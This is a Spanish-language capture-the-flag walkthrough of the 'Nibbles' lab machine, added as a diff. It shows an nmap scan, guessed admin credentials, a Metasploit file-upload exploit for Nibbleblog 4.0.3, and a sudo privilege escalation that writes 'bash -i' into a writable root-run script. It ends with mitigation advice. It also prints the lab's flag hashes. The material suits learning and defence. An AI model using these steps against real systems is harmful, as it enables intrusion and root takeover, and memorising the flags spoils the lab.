@@ -1,0 +1,93 @@
+Resumen Ejecutivo:
+
+Nibbles es una máquina Linux diseñada para poner a prueba las habilidades de enumeración web y la explotación manual de scripts. 
+El compromiso inicial se logra a través de un Arbitrary File Upload en un CMS desactualizado (Nibbleblog), y la escalada de privilegios, 
+se consigue abusando de una configuración laxa en el archivo /etc/sudoers, 
+que permite la ejecución de un script editable con permisos de root.
+
+Enumeración y Reconocimiento:
+
+Escaneo de Puertos (Nmap)
+Se realiza un escaneo de servicios y scripts predeterminados:
+
+nmap -sV -sC -Pn -oN nmap_nibbles.txt 10.129.34.250
+
+Puerto 22 (SSH): OpenSSH 7.2p2 Ubuntu.
+
+Puerto 80 (HTTP): Apache httpd 2.4.18.
+
+Web Discovery:
+
+Al acceder a http://10.129.34.250, la página muestra un "Hello world!". Tras inspeccionar el código fuente (Ctrl+U), se identifica un comentario crítico: ``
+
+Al navegar a /nibbleblog/, se confirma la presencia de un CMS Nibbleblog v4.0.3.
+
+Explotación (Foothold)
+
+Acceso Administrativo
+Se intenta acceder al panel de gestión en /nibbleblog/admin.php. Mediante técnicas de adivinación de credenciales basadas en el nombre de la máquina, se logra el acceso con:
+
+Usuario: admin
+
+Contraseña: nibbles
+
+Ejecución Remota de Código (RCE)
+
+Nibbleblog 4.0.3 es vulnerable a la subida de archivos arbitrarios a través del plugin "My Image".
+
+Uso de Metasploit:
+
+Módulo: exploit/multi/http/nibbleblog_file_upload
+
+Configuración:
+
+TARGETURI: /nibbleblog/
+
+USERNAME: admin
+
+PASSWORD: nibbles
+
+Al ejecutarlo, Metasploit sube un archivo PHP malicioso que nos devuelve una shell como el usuario nibbler.
+
+Escalada de Privilegios (LPE)
+
+python3 -c: Ejecuta un comando directamente desde la línea de comandos de Python.
+
+import pty; pty.spawn("/bin/bash"): Utiliza el módulo pty para crear un pseudo-terminal y lanzar una shell /bin/bash real. 
+Esto engaña al sistema haciéndole creer que hay un usuario real en una terminal física.
+Análisis de Sudo
+Se comprueban los privilegios de sudo del usuario comprometido:
+
+nibbler@Nibbles:~$ sudo -l
+(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+
+Explotación de Script Hijacking:
+
+Dado que el archivo se encuentra dentro del directorio personal del usuario, podemos manipular su contenido. 
+Si el archivo no existe, lo creamos junto con su estructura de directorios:
+
+mkdir -p /home/nibbler/personal/stuff
+echo "bash -i" > /home/nibbler/personal/stuff/monitor.sh
+chmod +x /home/nibbler/personal/stuff/monitor.sh
+
+Obtención de Root:
+
+Ejecutamos el script con privilegios de superusuario:
+
+sudo /home/nibbler/personal/stuff/monitor.sh
+
+Esto nos devuelve una shell con privilegios de ROOT.
+
+Banderas (Flags)
+User: c6ebd70c8d77b831728bec54241eb84f (/home/nibbler/user.txt)
+
+Root: 7d88bd04dfbe6fc7608a1aee341aa176 (/root/root.txt)
+
+Hardening y Mitigación
+Autenticación: Implementar un límite de intentos de login (Fail2Ban) para prevenir ataques de fuerza bruta en el panel admin.php.
+
+Seguridad del CMS: Actualizar Nibbleblog a una versión parcheada o migrar a un CMS con soporte activo.
+
+Privilegios de Sudo: Evitar permitir que usuarios de bajos privilegios ejecuten scripts que residan en directorios donde tienen permisos de escritura. 
+Si un script debe ejecutarse con sudo, su propietario debe ser root y los permisos deben ser 755.
+
